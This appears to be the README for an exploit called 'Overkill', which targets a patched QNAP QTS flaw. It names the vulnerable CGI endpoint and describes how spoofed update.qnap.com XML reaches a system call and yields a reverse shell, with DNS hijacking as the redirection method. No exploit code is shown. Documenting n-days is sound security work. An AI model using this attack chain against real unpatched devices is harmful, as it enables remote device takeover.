# Overkill

Overkill is an exploit for a patched vulnerability affecting QNAP QTS. Due to the way QNAP discloses vulnerabilities, I'm unsure if this issue has a CVE or not. However, it was likely patched in November 2020 and April 2021. The n-day was "discovered" while doing diff analysis for CVE-2020-2509. This is almost certainly not CVE-2020-2509. 

The exploit will send HTTP GET requests to `/cgi-bin/qnapmsg.cgi?lang=xxx` which will cause unpatched QNAP devices to download an XML file from `update.qnap.com` via insecure HTTP. An attacker that can redirect `update.qnap.com` to themselves can respond with an attacker controlled XML file. When the QNAP parses the XML file it will pass some of the contents to a `system` call, resulting in a reverse shell.

This exploit *does not* implement the method to get `update.qnap.com` requests directed to the exploit. In the example below, I was using router DNS hijacking on my own router... your mileage may vary.
